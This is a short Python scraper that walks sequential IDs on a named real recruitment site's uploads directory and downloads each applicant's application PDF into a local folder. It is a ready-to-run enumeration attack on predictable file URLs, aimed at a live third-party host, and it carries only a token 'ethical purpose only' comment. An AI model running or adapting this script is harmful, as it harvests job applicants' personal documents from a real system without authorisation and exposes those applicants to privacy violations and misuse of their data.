#This Tool officially Created By Bymego (Owned by Sindupath)

# pip install requests 
# if using linux 
# sudo apt install python3-requests
 
import os
import requests
import shutil

# function start here 

result_folder = 'results'

# create result folder
 
os.makedirs(result_folder, exist_ok=True)

def bymego(base_url, start, end):
 
# loop for change number  and url

    for num in range(start, end + 1):
        url = f"{base_url}/{num}_application.pdf" # url declare and setup 
        try:
            response = requests.get(url) # Getting Response using request package
            if response.status_code == 200 and 'application/pdf' in response.headers.get('Content-Type', ''):
                file_name = f"application_{num}.pdf"
                with open(file_name, 'wb') as file:
                    file.write(response.content)
                    shutil.move(file_name, os.path.join(result_folder, file_name))
                print(f"Downloaded: {file_name}")
            else:
                print(f"No PDF found at: {url}")
        except Exception as e:
            print(f"Error downloading {url}: {e}")

if __name__ == "__main__":

    base_url = "https://gr2recruit.cecri.res.in/uploads/applications" 
    #202410001 
    start_range = 202410225
    end_range = 202411000

    bymego(base_url, start_range, end_range)
    
    
    
# ethical purpose only
# if you getting trouble check on github https://github.com/sindupath
